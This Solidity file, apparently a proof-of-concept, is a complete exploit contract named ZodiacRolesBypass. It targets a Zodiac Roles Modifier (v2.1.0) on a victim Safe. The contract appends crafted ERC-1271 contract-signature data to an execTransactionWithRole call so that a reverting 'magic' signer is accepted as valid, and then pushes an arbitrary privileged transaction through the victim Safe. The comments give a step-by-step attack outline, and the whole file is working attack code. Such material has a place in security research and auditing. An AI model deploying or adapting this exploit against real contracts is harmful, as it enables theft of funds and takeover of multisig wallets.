// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/**
 * @title ZodiacRolesBypass
 * @notice Drives the ERC-1271 revert-magic bypass against a vulnerable
 *         Zodiac Roles Modifier (v2.1.0) that sits on a victim Safe.
 *
 * @dev Attack outline
 *   1. The Roles modifier is enabled as a module on the victim Safe, and a
 *      privileged Safe (with CompatibilityFallbackHandler) is enabled as a
 *      module/role member on the Roles modifier.
 *   2. We call `execTransactionWithRole` (NOT execTransactionFromModule:
 *      that one reads defaultRoles[msg.sender] which is zero for us) with
 *      the victim Safe's roleKey, and append crafted signature material to
 *      the calldata. Solidity's ABI decoder ignores the trailing bytes,
 *      but `moduleTxSignedBy()` parses them.
 *
 *   Appended calldata layout (parsed by moduleTxSignedBy):
 *
 *     [ normal ABI call: execTransactionWithRole(...)        ]  <- data[:start]
 *     [ innerSig: Safe contract-signature blob for magic c.  ]  <- data[start:end]
 *     [ salt (32)                                            ]
 *     [ r = safeSigner (32)                                  ]
 *     [ s = start offset (32)                                ]
 *     [ v = 0x00 (1)  -> contract-signature path             ]
 *
 *   3. moduleOnly() -> moduleTxSignedBy() -> v == 0 -> signer = safeSigner
 *      -> _isValidContractSignature(safeSigner, hash, innerSig)
 *      -> Safe (fallback handler) -> checkSignatures
 *      -> entry 0 is a contract signature pointing at RevertMagic1271
 *      -> it reverts with 0x1626ba7e -> the revert data propagates back to
 *      the Roles modifier, which ignores the failure and accepts the Safe
 *      as the valid signer.
 *   4. _authorize() then checks role.members[safeSigner] (true) and the
 *      role's permissions for the smuggled call, and finally executes it
 *      through the victim Safe via target.execTransactionFromModule().
 */
contract ZodiacRolesBypass {
    bytes4 private constant EXEC_WITH_ROLE =
        bytes4(
            keccak256(
                "execTransactionWithRole(address,uint256,bytes,uint8,bytes32,bool)"
            )
        );

    /**
     * @param roles        vulnerable Roles modifier (v2.1.0)
     * @param safeSigner   enabled module / role member: the Safe whose
     *                     CompatibilityFallbackHandler answers isValidSignature
     * @param magic        deployed RevertMagic1271 contract
     * @param roleKey      a role that `safeSigner` is a member of
     * @param safeThreshold threshold() of `safeSigner` (drives inner padding)
     * @param to,value,data,operation  the privileged call to smuggle through
     * @param salt         fresh salt (anti-replay in ExecutionTracker)
     */
    function exploit(
        address roles,
        address safeSigner,
        address magic,
        bytes32 roleKey,
        uint256 safeThreshold,
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        bytes32 salt
    ) external returns (bool) {
        // ------------------------------------------------------------------
        // Inner blob: ONE Safe "contract signature" (v == 0) for the magic
        // contract. Safe layout per entry:
        //   r (32) = contract signer address
        //   s (32) = offset of the dynamic part inside the blob
        //   v (1)  = 0x00
        //   dynamic part: abi length (32) + payload (0 bytes here)
        // ------------------------------------------------------------------
        bytes memory innerSig = abi.encodePacked(
            bytes32(uint256(uint160(magic))), // r: the magic-signer contract
            bytes32(uint256(65)), // s: dynamic part right after the 65-byte entry
            hex"00", // v = 0 -> contract signature
            bytes32(uint256(0)) // dynamic part length = 0
        );

        // Safe.checkSignatures requires signatures.length >= threshold * 65
        // BEFORE the loop. Entry #0 reverts with magic immediately, so the
        // remaining bytes are never read; we only pad to satisfy the length.
        uint256 minLen = safeThreshold * 65;
        if (innerSig.length < minLen) {
            innerSig = abi.encodePacked(innerSig, new bytes(minLen - innerSig.length));
        }

        // ------------------------------------------------------------------
        // Outer call: normal ABI call + appended signature material.
        // start (s) = payload.length => data[:start] is hashed by the modifier,
        // data[start:end] (the inner blob) is handed to the Safe as _signature.
        // ------------------------------------------------------------------
        bytes memory payload = abi.encodeWithSelector(
            EXEC_WITH_ROLE,
            to,
            value,
            data,
            operation,
            roleKey,
            true // shouldRevert: propagate inner failure
        );

        bytes memory trailing = abi.encodePacked(
            innerSig, // data[start:end] -> Safe._signature
            salt, // 32-byte salt read by moduleTxSignedBy
            bytes32(uint256(uint160(safeSigner))), // r: signer = the Safe
            bytes32(payload.length), // s: start offset
            hex"00" // v = 0 -> contract-signature path
        );

        (bool ok, bytes memory returndata) = roles.call(
            abi.encodePacked(payload, trailing)
        );
        if (!ok) {
            // bubble up the revert reason
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
        return ok;
    }
}
